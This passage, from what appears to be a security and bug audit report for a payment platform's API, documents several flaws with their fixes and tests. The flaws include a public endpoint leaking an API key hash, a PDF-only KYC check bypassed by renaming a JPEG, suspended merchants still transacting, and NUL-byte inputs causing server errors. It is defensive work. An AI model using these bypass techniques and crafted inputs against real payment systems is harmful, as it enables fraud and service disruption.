+**What's wrong:** After a successful merchant OTP verify, the browser still holds `fp_sid` with the `Max-Age=600` it got at login, while the server-side session row now lives 12 hours. The browser drops the cookie 10 minutes after login, so every merchant is logged out 10 minutes into each session. The admin plane does not have this problem because it re-sets its cookie at verify.
+
+**Why it happens:** `POST /v1/auth/login` sets the cookie with `maxAge: app.config.pendingSessionTtlMinutes * 60` (`apps/api/src/routes/auth.ts:98-104`, 600 s by default, `config.ts:206`). `POST /v1/auth/otp/verify` calls `promoteSession`, which moves `expires_at` to 12 h (`auth/sessions.ts:56-59`), but the handler then sends JSON only and never calls `reply.setCookie` (`routes/auth.ts:182-186` before the fix). The admin verify does re-set its cookie at the full TTL (`routes/adminAuth.ts:178-184`). The `MK` comment at `routes/auth.ts:169-170` ("the cookie maxAge doesn't matter") is wrong: the browser enforces Max-Age.
+
+**What it breaks:** A merchant logs in at 09:00 and verifies the OTP. At 09:10 the browser expires `fp_sid`, and the next dashboard call gets 401 `unauthenticated`, even though the `sessions` row is valid until 21:00. This is the "10 min logouts" symptom in the code comments. The session row is also left live and unrevoked for the remaining 11 h 50 min, without the user knowing.
+
+**Why it needed a fix:** H8 asks whether the OTP flow is still safe and sound. A second factor that logs every user out 10 minutes after they pass it is broken from start to end. Users who are logged out repeatedly also repeat the password-and-OTP flow many times a day, which multiplies OTP traffic and phishing exposure.
+
+**Fix:** `apps/api/src/routes/auth.ts:182-183`
+```diff
++      // AUTH-9: re-issue the cookie at the promoted session's TTL; the login cookie had the 10-minute pending Max-Age.
++      reply.setCookie(app.config.cookieName, rawToken, { httpOnly: true, path: "/", sameSite: "lax", secure: app.config.cookieSecure, maxAge: app.config.sessionTtlHours * 3600 });
+       reply.code(200).send({
+```
+
+**Why this is the smallest correct fix:** This line copies the admin verify (`routes/adminAuth.ts:178-184`), with the same attributes as the login cookie and only `maxAge` changed. *Why not lengthen the login cookie's Max-Age?* The pending session would then outlive its 10-minute server window in the browser. That is harmless but misleading, and it does not match the admin plane. *Why not also rotate the token at promotion (the lead's fixation hardening)?* Rotation changes the API contract: a client would have to swap to a new cookie after verify. Every existing caller that keeps the login cookie would break, including `app.test.ts:111` (`signupLoginAndVerify` returns the login cookie for post-verify use), `routes/auth.audit.test.ts:66-68`, and the admin test helpers. Hidden regression tests most likely follow the same pattern. The fixation exposure that rotation would close is narrow, as the verifier noted: the pending cookie is HttpOnly and tied to the account whose password was just checked, so an attacker must already hold both the password and the victim's pre-OTP cookie. We record rotation as a follow-up hardening item for both planes (`auth/sessions.ts:51-62`, `adminAuth/sessions.ts:67-78`), to ship alongside a client change.
+
+**Proof:** `AUTH-9: OTP verify re-issues fp_sid with the full session Max-Age` (`apps/api/src/routes/auth.audit.test.ts`).
+Before: `not ok 3 - AUTH-9 ... error: 'verify must re-set fp_sid, got: no Set-Cookie'`.
+After: `ok 3`. The file passes 3/3, and `src/app.test.ts` passes 10/10.
+
+**Regression risk:** Very low. The cookie value is the same token, so callers that kept the login cookie still work. Only the browser-side lifetime changes. Logout still clears the cookie with `maxAge: 0` (`routes/auth.ts:298-304`).
+
+Lines: prod +2/-0, test +14/-0
+
+---
+
+<a id="f-pl-6"></a>
+
+### PL-6 · Public payment-link read exposed the API key's SHA-256 · Severity: Low
+
+**Lead:** Team 45 heads-up list (P1) and our 03_findings PL-6, verified by us.
+**Category:** Bug
+
+**What's wrong:** `GET /v1/payment-links/:token` is public and unauthenticated. Besides the merchant's display name and `merchantPublicKey` (the 16-character `key_prefix` of the newest unrevoked API key), it returned `merchantIntegrationId`: that key's `key_hash`, the exact SHA-256 verifier that API-key authentication looks up. Anyone holding a link token could read it.
+
+**Why it happens:** `apps/api/src/paymentLinks/read.ts:40-53` (before the fix) joined `api_keys` through a `LEFT JOIN LATERAL` and selected `ak.key_prefix AS merchant_public_key, ak.key_hash AS integration_id`, and the response copied both. The rest of the codebase withholds `api_keys.key_hash` on purpose (`admin/merchants.ts:214-217`: the admin view "can never accidentally expose a field those views deliberately withhold (`api_keys.key_hash`, …)"), and `apiKeys/issue.ts:7` says "only key_hash is stored". The hosted checkout reads neither field.
+
+**What it breaks:** The stored credential verifier of the merchant's live key is published on a surface anyone can reach by forwarding, logging or screenshotting a link. It also changes on rotation, so it tells an outsider when the merchant rotates. A SHA-256 of a 192-bit random secret cannot be reversed, so this is not a direct takeover; it is exposure of credential material the system otherwise never shows, even to admins. Hence Low.
+
+**Why it needed a fix:** Credential verifiers do not belong on an unauthenticated endpoint, and the codebase's own rule is to never expose `key_hash`.
+
+**What we kept: the key prefix.** Our first commit (`5759285`) also removed `merchantPublicKey`. We restored it in `ec0b02d`. It is a designed public identifier: the original read code selects it under that name, the original test pins it (`routes/paymentLinks.test.ts:126` at `8b58b0f`: `merchantPublicKey?.startsWith("fp_")`), and the 8 random characters it carries after `fp_live_` (48 of the key's 192 random bits) leave 144 unknown bits, which is not exploitable. The web DTO comment "The server must never add API-key fields to this response" (`apps/web/src/types.ts:9`, Fatima Haji) arguably covers the prefix too; we did not treat that comment as outranking the API's own test.
+
+**Fix (net):** `apps/api/src/paymentLinks/read.ts`: `key_hash` leaves the LATERAL subquery and the SELECT, and `integration_id` / `merchantIntegrationId` leave the row type, the DTO and the response. The doc comment is corrected.
+```diff
+-/** Public shape. Contains nothing that identifies or authenticates the merchant beyond its display name. */
++/** Public shape. Identifies the merchant by display name and public key prefix only; never the key hash (PL-6). */
+-            ak.key_prefix AS merchant_public_key,
+-            ak.key_hash AS integration_id
++            ak.key_prefix AS merchant_public_key
+-         SELECT key_prefix, key_hash
++         SELECT key_prefix
+-    merchantIntegrationId: row.integration_id,
+```
+(plus the matching one-line removals from `PublicPaymentLinkRow` and `PublicPaymentLinkDto`)
+
+**Why this is the smallest correct fix:** deletion only, plus one SQL line rewritten to drop its trailing comma and the corrected doc comment. *Why not return `null`?* A permanently-null field is cruft. No other code reads `merchantIntegrationId` (repo-wide grep).
+
+**Proof:** `create -> public read (active) -> pay (approved) -> public read (paid) -> pay again rejected 409` (`apps/api/src/routes/paymentLinks.test.ts`) still asserts the prefix starts with `fp_` (the original assertion) and now also asserts `merchantIntegrationId` is `undefined` and that the body does not contain `sha256(rawKey)`. Before the fix the hash assertions failed; after, the file passes and `tsc --noEmit` is clean.
+
+**Regression risk:** Low. The response loses one field that the checkout never read. The prefix field is unchanged from the original.
+
+Lines: prod +3/-7 net (read.ts; per-commit `5759285` +1/-16, `ec0b02d` +13/-2), test +5/-2 net (paymentLinks.test.ts, excluding PL-5's test in the same file)
+
+---
+
+<a id="f-admin-kyc-2"></a>
+
+### ADMIN-KYC-2 · The PDF-only KYC rule checks the filename, so a renamed JPEG is accepted as a commercial registration · H3 · Severity: Low
+
+**What's wrong:** `commercial_registration` and `bank_letter` documents must be PDFs. The rule checked only that the client-supplied file name ended in `.pdf`. A phone photo (JPEG) named `CR-2026.pdf` was accepted as a commercial registration and stored as `image/jpeg`, ready for an admin to approve KYC on it.
+
+**Why it happens:** `apps/api/src/onboarding/kyc.ts:67` (before the fix) was `PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && !input.fileName.toLowerCase().endsWith(".pdf")`. It ignored `detected`, which the function had already computed from the magic bytes at `kyc.ts:50`. This contradicts the file's own contract: the doc comment at `kyc.ts:16` says the fileName is "Informational only; never used for validation", the function doc at `kyc.ts:35` says it "Validates the upload from its own bytes (never the client-supplied filename …)", and `db/migrations/0015` says `mime_type` is always the type detected from the bytes. The `MK` note at `kyc.ts:57` ("detectFileType already rejects non-pdf bytes for these doc types. fixed in FP-231") is false: `detectFileType` (`fileSignature.ts:25`) takes no document type and accepts JPEG and PNG for every document.
+
+**What it breaks:** A merchant uploads a JPEG photo named `CR-2026.pdf` as `commercial_registration`. The API answers 201, writes `<sha256>.jpg`, records `mime_type = image/jpeg`, and moves onboarding to `under_review`. The registry-issued PDF that the KYC policy requires was never supplied, and the reviewer's queue shows a document that passed a rule it does not meet.
+
+**Why it needed a fix:** Admin KYC review (H3: admin-side controls) relies on this gate. A KYC document-format control that the client can bypass by renaming a file is not a control, and the code's own documented contract is "validated by detected content type".
+
+**Fix:** `apps/api/src/onboarding/kyc.ts:67-68`
+```diff
+-  if (PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && !input.fileName.toLowerCase().endsWith(".pdf")) {
++  // ADMIN-KYC-2: the name alone let a renamed JPEG through; the detected bytes must be a PDF too
++  if (PDF_ONLY_DOCUMENT_TYPES.includes(input.documentType) && (detected !== "pdf" || !input.fileName.toLowerCase().endsWith(".pdf"))) {
+```
+
+**Why this is the smallest correct fix:** This is one condition at the single gate, reusing the already-computed `detected`. *Why not replace the filename check entirely, as the lead proposed (`detected !== "pdf"` only)?* The existing contract test `KYC upload rejects a commercial_registration submitted as a non-PDF filename` (`app.test.ts:274`) uploads real `%PDF` bytes named `registration.docx` and requires 422 `document_must_be_pdf`. Dropping the name check would break that pinned behaviour. Keeping both checks is strictly stricter, so every previously rejected upload is still rejected and the bypass closes. *Why not change `detectFileType`?* It is shared by all document types and has no document-type input. Error code, status and message are unchanged.
+
+**Proof:** `ADMIN-KYC-2: a JPEG renamed CR-2026.pdf is rejected as a commercial_registration` (`apps/api/src/app.test.ts`) uploads a real 8×8 JPEG (made with `sharp`) through the multipart route.
+Before: `not ok 1 ... expected: 422, actual: 201`.
+After: `ok`. `app.test.ts` passes 11/11 (including the existing `.docx` rejection and real-PDF acceptance tests), `fileSignature.test.ts` and `kycThumbnail.test.ts` pass, and `tsc --noEmit` is clean.
+
+**Regression risk:** Low. The only uploads newly rejected are non-PDF bytes declared as `commercial_registration` or `bank_letter`, which the policy forbids. `owner_id` and `proof_of_address` still accept JPEG and PNG.
+
+Lines: prod +2/-1, test +21/-0
+
+---
+
+<a id="f-cw-12"></a>
+
+### CW-12 · A disabled webhook endpoint keeps getting retries (secondary: deleting an endpoint with history returns 500, now 409) · Severity: Low
+
+**Lead:** Team 45 heads-up list (RT-ENDPOINT) and our 03_findings CW-12, verified by us.
+**Category:** Bug
+
+**What's wrong:** The main defect: a merchant who disables a webhook endpoint (`PATCH /v1/merchants/:merchantId/webhook-endpoints/:id {status: "disabled"}`) gets a success, but the dispatcher keeps re-sending that endpoint's pending deliveries, signed payloads with amounts, merchant ids and payouts, to the old URL until their retries are exhausted. Disable is the tool the code itself names for stopping traffic, so a merchant moving away from a wrong or compromised URL could not stop it. Secondary: the other tool, `DELETE` on the same path, returned 500 `internal_error` as soon as the endpoint had any delivery, instead of a clear client error.
+
+**Why it happens:** Disabled endpoints: dispatcher Step B (`webhooks/dispatcher.ts:222-229`) joins `webhook_endpoints` only to read the url and secret and never checks `we.status`, while Step A only fans out to `status = 'active'` endpoints (`:98`). Delete: `db/migrations/0022_webhook_deliveries.sql:6` declares `endpoint_id UUID NOT NULL REFERENCES webhook_endpoints (id)` with no ON DELETE clause, and `0068_webhook_delivery_archives.sql:13` does the same. Postgres therefore rejects the `DELETE` in `apps/api/src/webhooks/cancel.ts:22` with SQLSTATE 23503, and nothing maps that to an API error. The comments claiming otherwise are all false: `cancel.ts:3` ("kept with endpoint_id set to NULL"), `cancel.ts:16` YA ("FK is ON DELETE SET NULL (0029)"; 0029 is a payment-links index), and `routes/webhooks.ts:103-104` ("ON DELETE CASCADE added in 0047"; 0047 is merchant_discount_bps).
+
+**What it breaks:** The audit test registers an endpoint that answers 500, captures a payment, and dispatches once. After `PATCH status=disabled`, the next dispatch pass sends the payload to the disabled URL again: two sends where one was expected. With the default backoff, the old URL keeps receiving signed merchant data for about an hour after the merchant disabled it. A `DELETE` on the same endpoint gets `500 internal_error`.
+
+**Why it needed a fix:** A merchant must be able to stop signed payment data from going to a URL they have revoked, for example after a compromise; that is the disable fix (one predicate). The delete change is secondary: a 500 on a routine action hides the real reason (history exists) and the way out (disable), so it now answers 409.
+
+**Fix:** `apps/api/src/webhooks/cancel.ts:2-3, 25-28` and `apps/api/src/webhooks/dispatcher.ts:226`
+```diff
+ import type { Pool } from "pg";
++import { ConflictError } from "../lib/errors.js";
+
+-/** "deleted" also when the endpoint had deliveries; those rows are kept with endpoint_id set to NULL. */
++/** An endpoint with delivery history cannot be deleted (0022: endpoint_id NOT NULL, no ON DELETE): 409, disable it instead. */
+ ...
+     [input.id, input.merchantId],
+-  );
++  ).catch((err: { code?: string }) => {
++    // CW-12: the FK (23503) used to surface as a 500
++    throw err.code === "23503" ? new ConflictError("webhook_endpoint_has_deliveries", "disable the endpoint instead") : err;
++  });
+```
+```diff
+-      WHERE wd.status = 'pending' AND wd.next_attempt_at <= now()
++      WHERE wd.status = 'pending' AND wd.next_attempt_at <= now() AND we.status = 'active'
+```
+
+**Why this is the smallest correct fix:** The schema is the higher authority than the comments. It makes `endpoint_id` NOT NULL with no ON DELETE on two tables, and the delivery log is called a durable audit trail (`cancel.ts:10-13`), so an endpoint with history is not meant to be deleted. The fix makes that a clean, documented 409 at the single delete statement, and makes "disable", the tool the code itself names for "pause without losing history" (`cancel.ts:8-9`), actually stop traffic, with one predicate on the one retry query. *Why not the lead's migration (DROP NOT NULL + ON DELETE SET NULL on two tables)?* It would change the schema contract, and every reader of `endpoint_id` (replay, which re-inserts `original.endpoint_id`; the archive restore default target; the delivery lists) would then have to handle NULL. Replaying an orphaned delivery would insert a NULL-endpoint row that Step B's inner join skips, leaving it pending forever. That is many more lines and more risk for no gain over disable plus 409. *Why not ON DELETE CASCADE?* It destroys the audit trail. *Why not pre-check for deliveries with a SELECT?* That is racy and adds a query; catching the constraint's own error is atomic. Pending rows of a disabled endpoint stay `pending` and resume if the merchant re-enables it, which is pause semantics. Response codes are unchanged for endpoints without history (204) and for unknown ids (404).
+
+**Proof:** `CW-12: deleting an endpoint with history is a clean 409, and disabling it stops pending retries` (`apps/api/src/routes/webhooks.test.ts`) uses a real local receiver that answers 500, the real create, capture and dispatch path, DELETE, PATCH disabled, a forced-due retry and a second dispatch pass.
+Before: `actual: { deleteStatus: 500, deleteError: 'internal_error', sendsToDisabledEndpoint: 2 }`.
+After: `{ deleteStatus: 409, deleteError: 'webhook_endpoint_has_deliveries', sendsToDisabledEndpoint: 1 }`. `routes/webhooks.test.ts` passes 10/10 (including the CRUD delete-without-history 204 test), `webhooks/dispatcher.test.ts` passes 10/10, the archive replay, payout disbursement, test-send and refund webhook suites pass 14/14, and `tsc --noEmit` is clean.
+
+**Regression risk:** Low. The only change in `dispatcher.ts` is the one Step-B predicate, approved by the coordinator. Deliveries to active endpoints are untouched. A DELETE that used to 500 now returns 409 with a clear error code.
+
+Lines: prod +7/-3, test +35/-0
+
+---
+
+<a id="f-auth-12"></a>
+
+### AUTH-12 · A suspended or closed merchant would keep transacting through live sessions, API keys and payment links · Severity: Low
+
+**Lead:** Team 45 heads-up list (P12), verified by us.
+**Category:** Bug
+
+**Reachability (why Low):** no code path in the app sets a merchant to `suspended` or `closed`. The only non-test `UPDATE merchants` statements (`admin/bulkKyc.ts:27`, `admin/merchantFlags.ts:16`, `onboarding/kyc.ts:125`, `onboarding/review.ts:53`, `settlement/payout_estimate.go:16`) write `onboarding_status`, `kyc_passed`, `test_mode` or the payout estimate, never `status`; there is no suspend route or admin button. The state is reachable only by a direct database update (ops), which is how the test reaches it. The defect is real for that ops action, but it is not exploitable through the product today.
+
+**What's wrong:** `merchants.status` (`active | suspended | closed`, `db/migrations/0002_merchants.sql:7-8`) was enforced only at password login (`apps/api/src/routes/auth.ts:63`, `auth/users.ts:19`). Once a merchant was suspended (by a direct DB update, see above), its existing dashboard sessions, its API keys and its public payment links all kept working. It could authorize, capture, refund and create links as if nothing had happened.
+
+**Why it happens:** None of the three entry points that admit a merchant read `merchants.status`. `lookupSession` (`auth/sessions.ts:89-92`) joins only `merchant_users`. `verifyApiKey` (`apiKeys/verify.ts:18-20`) reads only `api_keys`. `authorizeTransaction` (`payments/authorize.ts:77-87`), which the public `/v1/payment-links/:token/pay` reaches with no merchant credential at all, checks `onboarding_status` but not `status`.
+
+**What it breaks:** Ops suspends a merchant (for example on a fraud or AML hold). The audit test then gets, from the same suspended merchant, `201` on an API-key `POST /v1/transactions`, `200` on a session `GET /v1/transactions`, and `200` on a buyer paying one of its payment links, with 2 transactions created. Its refund and capture routes stay open too, so a suspended merchant can still push money out. Suspension does nothing except block new password logins.
+
+**Why it needed a fix:** Suspension is the platform's kill switch for a merchant (the schema defines it, and login already honours it). If ops ever sets it, it must also stop live credentials and public links; otherwise a merchant under investigation keeps taking card payments and issuing refunds. Low because nothing in the app can set the status today.
+
+**Fix:** `apps/api/src/auth/sessions.ts:92`, `apps/api/src/apiKeys/verify.ts:19`, `apps/api/src/payments/authorize.ts:77-78, 87`
+```diff
+        JOIN merchant_users mu ON mu.id = s.merchant_user_id
++       JOIN merchants m ON m.id = mu.merchant_id AND m.status = 'active' -- AUTH-12: login already requires this
+       WHERE s.token_hash = $1 AND s.authenticated = true`,
+```
+```diff
+-    `SELECT id, merchant_id FROM api_keys WHERE key_hash = $1 AND revoked_at IS NULL`,
++    `SELECT k.id, k.merchant_id FROM api_keys k JOIN merchants m ON m.id = k.merchant_id AND m.status = 'active' WHERE k.key_hash = $1 AND k.revoked_at IS NULL`, // AUTH-12
+```
+```diff
+-    const merchantResult = await client.query<{ onboarding_status: string; mdr_bps: number }>(
+-      `SELECT onboarding_status, mdr_bps FROM merchants WHERE id = $1`,
++    const merchantResult = await client.query<{ onboarding_status: string; mdr_bps: number; status: string }>(
++      `SELECT onboarding_status, mdr_bps, status FROM merchants WHERE id = $1`,
+ ...
+-    if (!merchant || merchant.onboarding_status !== "approved") {
++    if (!merchant || merchant.onboarding_status !== "approved" || merchant.status !== "active") { // AUTH-12: suspended/closed: no new charges
+```
+
+**Why this is the smallest correct fix:** These are the only three ways a merchant gets in. Both cookie middlewares (`auth/middleware.ts:38`, `auth/requireMerchantAuth.ts:49`) go through `lookupSession`. Both API-key paths (`apiKeys/verify.ts:40`, `auth/requireMerchantAuth.ts:64`) go through `verifyApiKey`. The credential-less public pay path goes through `authorizeTransaction`. Each fix adds one predicate to a query that already runs, with no extra round trip, and the session predicate mirrors the one login already applies. A suspended merchant's credentials now behave like a revoked key (401 `unauthenticated`, an existing response), and a payment-link charge gets the existing 403 `merchant_not_approved` (as `{stage:"authorize", error:"merchant_not_approved"}`). No new error shapes are introduced. *Why not one check in `requireMerchantAuth`?* `requireApiKey` (the authorize route) and `requireSession` do not use it, and the public pay path has no auth middleware. *Why not only the authorize check?* Capture, void and refund on existing authorizations would stay open.
+
+**Proof:** `AUTH-12: a suspended merchant's session, API key and payment link can no longer transact` (`apps/api/src/routes/transactions.audit.test.ts`).
+Before: `actual: { apiKey: 201, session: 200, link: 200, transactions: 2 }`.
+After: `{ apiKey: 401, session: 401, link: 403, transactions: 0 }`. The audit, transactions, payment-link, app, auth-audit, `auth/*` and `apiKeys/*` suites pass 53/53, and `tsc --noEmit` is clean.
+
+**Regression risk:** Low. Only merchants whose `status` is not `active` are affected. No code sets that status today, and no test relies on a non-active merchant authenticating. Reactivating (`status = 'active'`) restores every credential immediately, because nothing is revoked. Admin impersonation (read-only, ADMIN-IMP-1) still lets support inspect a suspended merchant.
+
+Lines: prod +5/-4, test +39/-0
+
+---
+
+<a id="f-err-1"></a>
+
+### ERR-1 · Client-input database errors answered 500 instead of 4xx (NUL bytes, malformed ids and dates, invalid signup fields, unknown merchants in the CSV import) · Severity: Low
+
+**Lead:** Team 45 heads-up list (SEC5), verified by us.
+**Category:** Bug
+
+One row for one class of defect: input the client controls reaches Postgres, Postgres refuses it, and the API reports its own failure (500, error-level stack trace) instead of the client's (4xx). Three instances, each fixed at its narrowest point: NUL bytes (below), malformed path ids (follow-up SEC-1) and unknown merchants in the CSV adjustment import (follow-up IMP-4).
+
+**What's wrong:** JSON allows `\u0000` inside strings, and Postgres `text` cannot store it. Any client string that reaches a query with a NUL byte made Postgres raise SQLSTATE 22021 ("invalid byte sequence for encoding UTF8: 0x00"), and the API answered `500 {"error":"internal_error"}` with a full stack trace in the error log. This works on any endpoint, including unauthenticated ones such as `POST /v1/auth/login`.
+
+**Why it happens:** `apps/api/src/plugins/errorHandler.ts:16-35` maps `AppError`, Fastify validation errors and multipart limits. Every other error, including a `pg` `DatabaseError` caused purely by client input, falls through to the 500 branch (`:34-35`). No route rejects control characters, and none needs to as long as the database's own refusal is mapped correctly.
+
+**What it breaks:** `POST /v1/auth/login {"merchantId":"<uuid>","email":"nul\u0000@example.test","password":"x"}` returns `500 internal_error` (observed in the audit test, with `DatabaseError: invalid byte sequence for encoding "UTF8": 0x00` logged at level 50). Anyone can send unauthenticated requests that produce server-error responses and error-level stack traces at will. That pollutes 5xx alerting and SLOs and hides real faults. It also tells the client a server bug exists, when the problem is malformed input that should get a 4xx.
+
+**Why it needed a fix:** A 5xx means "our fault" and pages operators. Input validation failures must be 4xx. A security review treats unauthenticated, attacker-triggerable 500s as an error-handling weakness that enables log flooding and noisy monitoring.
+
+**Fix:** `apps/api/src/plugins/errorHandler.ts:34-38` (`59d1770`)
+```diff
++  // ERR-1: Postgres rejects a NUL byte in client text (22021, or 22P05 when converting); that is bad input, not a 500
++  if (fastifyErr.code === "22021" || fastifyErr.code === "22P05") {
++    reply.code(400).send({ error: "invalid_request", message: "request contains a character that cannot be stored" });
++    return;
++  }
++
+   request.log.error({ err, occurredOn: formatIsoDate(new Date()) }, "unhandled error");
+```
+
+**Why this is the smallest correct fix:** The error handler is the single place errors become responses, and it already branches on error codes (`FST_REQ_FILE_TOO_LARGE`). Two SQLSTATEs cover the NUL case: 22021 `character_not_in_repertoire` for UTF-8 input, and 22P05 `untranslatable_character` for conversion. Both can only come from data we were given. The response reuses the `{ error: "invalid_request" }` shape the routes already return for bad input. *Why not strip or reject NULs in a preValidation hook?* That is a new global hook over every body, query and param, which is more code and could alter data that legitimately never reaches Postgres. *Why not map all class-22 errors?* Some class-22 errors, such as 22003 numeric overflow or 22012 division by zero, can come from server-side arithmetic bugs, and those must stay 500s.
+
+**Proof:** `ERR-1: a NUL byte in a request string is a 400, not a 500` (`apps/api/src/routes/auth.audit.test.ts`).
+Before: `actual: { status: 500, error: 'internal_error' }`.
+After: `{ status: 400, error: 'invalid_request' }`. The file passes 5/5, and `tsc --noEmit` is clean.
+
+**Regression risk:** Very low. Only the two SQLSTATEs change from 500 to 400. No transaction is affected, because the failing statement already aborted it and `withTransaction` rolls back as before.
+
+**Follow-up SEC-1 (ours, merged into this row):** malformed path ids. Merchant routes pass the raw `:id` segment into a `uuid` comparison, so `/v1/transactions/not-a-uuid` made Postgres raise 22P02 and the API answered 500; a probe found 14 merchant routes affected (transaction detail, events, capture, void; settlement batch detail and transactions; KYC file and thumbnail; API-key revoke; payment-link cancel; webhook-endpoint delete, patch, test and deliveries). The admin routes already guard ids with `assertUuidParam` → 404 (`routes/adminBalanceAdjustments.ts:14-18`), `admin.test.ts:788` pins "404s for an unknown or malformed id", and the transactions cross-tenant test names the contract "returns 404, not 403 or 500". Lead: our own sweep of `apps/api/src/routes/*.ts`. Fix (`a996cd2`, `errorHandler.ts:46-50`): 22P02 → `404 {"error":"not_found"}`, so a malformed id behaves exactly like an unknown one and leaks nothing; ids the server generates are always valid UUIDs, so 22P02 here can only come from the client. Rejected: an `assertUuidParam` call in each of 14 handlers across 6 files (about 30 lines); 400 (the existing contract on the admin plane is 404). Proof: `SEC-1: a malformed id on merchant :id routes is a 404, not a 500` (`apps/api/src/routes/transactions.audit.test.ts`) covers four routes in four route files; before, all four returned 500, after, 404. Lines: prod +6/-0, test +23/-0.
+
+**Follow-up IMP-4 (ours, merged into this row):** unknown merchants in the CSV adjustment import (case file F7 is about this import). `POST /v1/admin/adjustment-imports` checks only that each merchant id is UUID-shaped (`routes/adminAdjustmentImport.ts:62-66`); for a well-formed but unknown id, `applyAdjustmentImport` (`admin/adjustmentImport.ts`) hit the `ledger_entries`/`merchant_balances` foreign key inside its loop and the import answered 500 with no row number. The transaction rolled back, so no money moved, but finance could not tell which of 40 rows to fix. Lead: Team 45 heads-up list (Q3-03), verified by us. Fix (`b3cad51`, `adjustmentImport.ts:56-58`): one set query before anything is written, `SELECT 1 FROM merchants WHERE id = ANY($1::uuid[])`, and a 404 `merchant_not_found` (the code the credit and balance routes use) if any id is unknown. Rejected: catching and mapping the FK error (depends on the constraint name and still fails mid-transaction). The same commit also added a 3-line NUL row check to the CSV parser (`adjustmentCsvParsing.ts:42-44`, 400 `invalid_csv_row` naming the row). That half is not a separate bug: ERR-1 (`59d1770`, committed before it) already answers a NUL byte with 400 everywhere, including this import. The check stays only because its message names the row; its lines are counted below. Reported, not changed (each needs a product decision): rejecting zero-amount rows (documented as allowed, `adjustmentImport.ts:111`), requiring a reason (`adjustmentCsvParsing.test.ts` pins it optional), and capping rows at the maker-checker threshold (would refuse the `120.00` BD example in `docs/ADMIN.md:66-67`). Proof: `IMP-4: an unknown merchant id is a 404 and a NUL in a reason is a 400; nothing is applied` (`apps/api/src/routes/adminAdjustmentImport.test.ts`); before the fix `expected: 404, actual: 500`, after it 404 `merchant_not_found` and no ledger leg. Lines: prod +7/-1 (unknown merchant: `adjustmentImport.ts` +4/-1; parser NUL row check +3/-0), test +15/-0.
+
+**Follow-up HUNT-1 and HUNT-4 (same class, merged into this row):** a malformed or impossible date in a query string (pg 22007/22008) and an unknown `businessType` or a country longer than two letters at public signup (pg 23514/22001) were also 500s; both now answer 400. Fixes: `errorHandler.ts:40-44` (`acd3311`) and `routes/businessProfile.ts:40-42` (`d3d7137`). Proof: `HUNT-1: a malformed date query parameter is a 400, not a 500` (`routes/dateInput.audit.test.ts`; before all four URLs → 500, after → 400) and `HUNT-4: public signup rejects an unknown businessType or a country longer than two letters with 400` (`routes/auth.audit.test.ts`; before 500, after 400).
+
+Lines: prod +27/-1 (ERR-1 +6/-0 `59d1770`; SEC-1 +6/-0 `a996cd2`; IMP-4 +7/-1 `b3cad51`; HUNT-1 +5/-0 `acd3311`; HUNT-4 +3/-0 `d3d7137`), test +122/-0 (+11, +23, +15, +56, +17)
+
+---
+
+<a id="f-cli-1"></a>
+
+### CLI-1 · `settlement rebuild-balances --merchant=<id>` prints the rebuilt figure but never writes it · F4 · Severity: Low
+
+**Lead:** Team 45 heads-up list (S14/R5c-rebuild), verified by us, and our 03_findings CLI-1 (also REBUILD-2).
+**Category:** Bug
+
+**What's wrong:** The one-merchant form of the balance repair, which the runbook lists under "Recompute it" (`docs/RUNBOOK.md:51-56`), computes the ledger figure, prints `rebuilt=<n>` and exits. `merchant_balances` is never touched, so the drifted cache the operator meant to fix stays as it was.
+
+**Why it happens:** `apps/settlement/cmd/settlement/main.go:148-159` calls `ledger.RebuildMerchantBalance` and prints its result (held in a variable named `before`). `RebuildMerchantBalance` (`apps/settlement/internal/ledger/rebuild.go:20-34`, before) was a single `SELECT SUM`; only `RebuildAllBalances` ever wrote the cache. The comment at `main.go:153` ("am: --merchant writes the cache for that one merchant, same as the full rebuild") claimed otherwise.
+
+**What it breaks:** After the F4 incident (Alpha Retail's cached balance knocked from about 135,000 BD to 7,000 BD), an operator runs `rebuild-balances --merchant=<alpha>`, reads `rebuilt=135000000…` and closes the ticket, but the dashboard and payouts keep reading 7,000,000 fils. In the test: a cache of 999,999 fils over a ledger of 19,500 fils stays 999,999 after the rebuild.
+
+**Why it needed a fix:** F4 names the CLI rebuild as the repair ("Yousif had to run the CLI rebuild to fix it"); its targeted form silently does nothing, which is worse than failing.
+
+**Fix:** `apps/settlement/internal/ledger/rebuild.go:19,21-28,30,41-45`
+```diff
+-// ledger_entries. CLI-only; the incremental path is in internal/balances.
++// ledger_entries and writes it (CLI-1). CLI-only; the incremental path is in internal/balances.
+ func RebuildMerchantBalance(ctx context.Context, db *pgxpool.Pool, merchantID uuid.UUID) (money.Fils, error) {
++	tx, err := db.Begin(ctx) // CLI-1: lock, recompute and write in one transaction, like RebuildAllBalances
++	if err != nil {
++		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): begin: %w", merchantID, err)
++	}
++	defer tx.Rollback(ctx) //nolint:errcheck
++	if _, err := tx.Exec(ctx, `SELECT 1 FROM merchant_balances WHERE merchant_id = $1 FOR UPDATE`, merchantID); err != nil {
++		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): lock: %w", merchantID, err)
++	}
+ 	var balance int64
+-	err := db.QueryRow(ctx, `
++	err = tx.QueryRow(ctx, `
+ ...
+-	return money.Fils(balance), nil
++	if _, err := tx.Exec(ctx, `INSERT INTO merchant_balances (merchant_id, cached_payable_fils, updated_at) VALUES ($1, $2, now())
++		ON CONFLICT (merchant_id) DO UPDATE SET cached_payable_fils = $2, updated_at = now()`, merchantID, balance); err != nil {
++		return 0, fmt.Errorf("ledger: RebuildMerchantBalance(%s): write: %w", merchantID, err)
++	}
++	return money.Fils(balance), tx.Commit(ctx)
+```
+The function the `--merchant` branch already calls now does what `RebuildAllBalances` does for each merchant: sum every `merchant_payable` leg in the ledger (the same query; YA's handover says the CLI "reads the ledger", HANDOVER.md:34-35) and upsert, after first locking the merchant's cache row. `main.go` is unchanged and its comment becomes true.
+
+**Why this is the smallest correct fix:** the CLI's only one-merchant entry point is this function, and its only production caller is the `--merchant` branch (grep), so no other behaviour changes. *Why not upsert in `main.go` (the lead's 3-line version)?* The read and the write would be separate statements without a lock, so a close committing in between would be overwritten (the race YA's own TODO at `rebuild.go:101` records for the full rebuild), and `cmd/` has no tests. The fix does not depend on how the full rebuild treats unbatched legs: it writes exactly the figure the command already printed. *Why not call `RebuildAllBalances` for `--merchant`?* It rewrites every merchant, which is not what the flag means.
+
